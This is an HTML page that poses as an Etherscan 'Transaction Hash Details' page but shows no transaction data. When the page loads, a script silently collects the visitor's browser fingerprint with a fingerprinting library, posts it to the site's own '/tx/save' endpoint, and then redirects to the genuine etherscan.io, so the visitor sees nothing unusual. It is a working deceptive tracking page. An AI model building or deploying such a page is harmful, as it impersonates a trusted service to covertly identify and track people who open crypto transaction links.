<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>
        Ethereum Transaction Hash (Txhash) Details | Etherscan
    </title>

    <meta name="Description" content="Ethereum (ETH) detailed transaction info for txhash. The transaction status, block confirmation, gas fee, Ether (ETH), and token transfer are shown." />
    
    <meta property="og:title" content="Ethereum Transaction Hash (Txhash) Details | Etherscan" />
    <meta property="og:description" content="Ethereum (ETH) detailed transaction info for txhash. The transaction status, block confirmation, gas fee, Ether (ETH), and token transfer are shown." />

</head>
<body>
    <script type="text/javascript" src='/scripts/fingerprint.min.js'></script>
    <script>
        async function saveJSON() {
            var json = await MonitoJsFingerprint.getFingerprintJSON()

            await fetch('/tx/save', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            })

            window.location.href = "https://etherscan.io/tx/" + "";
        }

        saveJSON()
    </script>
</body>
